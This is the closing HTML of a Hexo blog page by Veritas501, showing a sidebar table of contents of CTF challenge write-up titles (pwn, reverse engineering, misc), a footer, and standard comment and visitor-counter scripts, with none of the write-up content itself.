                又智障了 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/215.png"
                alt="Veritas501" />
            
              <p class="site-author-name" itemprop="name">Veritas501</p>
              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">62</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">37</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-美丽的实验室logo"><span class="nav-number">1.</span> <span class="nav-text">Basic - 美丽的实验室logo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-神秘的文件"><span class="nav-number">2.</span> <span class="nav-text">Basic - 神秘的文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-Help"><span class="nav-number">3.</span> <span class="nav-text">Basic - Help!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-Shellcode"><span class="nav-number">4.</span> <span class="nav-text">Basic - Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-A-Piece-Of-Cake"><span class="nav-number">5.</span> <span class="nav-text">Basic - A Piece Of Cake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-字符串"><span class="nav-number">6.</span> <span class="nav-text">Basic - -.-字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-Smali"><span class="nav-number">7.</span> <span class="nav-text">Reverse - Smali</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level0"><span class="nav-number">8.</span> <span class="nav-text">PWN - [XMAN]level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Tell-Me-Something"><span class="nav-number">9.</span> <span class="nav-text">PWN - Tell Me Something</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level1"><span class="nav-number">10.</span> <span class="nav-text">PWN - [XMAN]level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level2"><span class="nav-number">11.</span> <span class="nav-text">PWN - [XMAN]level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level2-x64"><span class="nav-number">12.</span> <span class="nav-text">PWN - [XMAN]level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level3"><span class="nav-number">13.</span> <span class="nav-text">PWN - [XMAN]level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Smashes"><span class="nav-number">14.</span> <span class="nav-text">PWN - Smashes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level3-x64"><span class="nav-number">15.</span> <span class="nav-text">PWN - [XMAN]level3(x64)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level4"><span class="nav-number">16.</span> <span class="nav-text">PWN - [XMAN]level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level5"><span class="nav-number">17.</span> <span class="nav-text">PWN - [XMAN]level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Test-Your-Memory"><span class="nav-number">18.</span> <span class="nav-text">PWN - Test Your Memory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-guess"><span class="nav-number">19.</span> <span class="nav-text">PWN - guess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Backdoor"><span class="nav-number">20.</span> <span class="nav-text">PWN - Backdoor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Guestbook2"><span class="nav-number">21.</span> <span class="nav-text">PWN - Guestbook2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-XMAN-level6"><span class="nav-number">22.</span> <span class="nav-text">PWN - [XMAN]level6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-Xman-level6-x64"><span class="nav-number">23.</span> <span class="nav-text">PWN - [Xman]level6_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-HTTP"><span class="nav-number">24.</span> <span class="nav-text">PWN - HTTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-ItemBoard"><span class="nav-number">25.</span> <span class="nav-text">PWN - ItemBoard</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE-Classical-CrackMe2"><span class="nav-number">26.</span> <span class="nav-text">RE - Classical CrackMe2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE-软件密码破解-1"><span class="nav-number">27.</span> <span class="nav-text">RE - 软件密码破解-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE-软件密码破解-2"><span class="nav-number">28.</span> <span class="nav-text">RE - 软件密码破解-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-misc100"><span class="nav-number">29.</span> <span class="nav-text">MISC - misc100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-炫酷的战队logo"><span class="nav-number">30.</span> <span class="nav-text">MISC - 炫酷的战队logo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-取证2"><span class="nav-number">31.</span> <span class="nav-text">MISC - 取证2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-Class10"><span class="nav-number">32.</span> <span class="nav-text">MISC - Class10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-You-Need-Python"><span class="nav-number">33.</span> <span class="nav-text">MISC - You Need Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-61dctf-inst"><span class="nav-number">34.</span> <span class="nav-text">PWN - 61dctf_inst</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-61dctf-hsys"><span class="nav-number">35.</span> <span class="nav-text">PWN - 61dctf_hsys</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Veritas501</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>




        








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  





  








  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
        placeholder: '说点什么...',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            
            counter.save(null, {
              success: function(counter) {
                
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
                
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            
              var newcounter = new Counter();
              /* Set ACL */
              var acl = new AV.ACL();
              acl.setPublicReadAccess(true);
              acl.setPublicWriteAccess(true);
              newcounter.setACL(acl);
              /* End Set ACL */
              newcounter.set("title", title);
              newcounter.set("url", url);
              newcounter.set("time", 1);
              newcounter.save(null, {
                success: function(newcounter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
                },
                error: function(newcounter, error) {
                  console.log('Failed to create');
                }
              });
            
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  
  

  


  
  

  

  

  

  

  

</body>
</html>
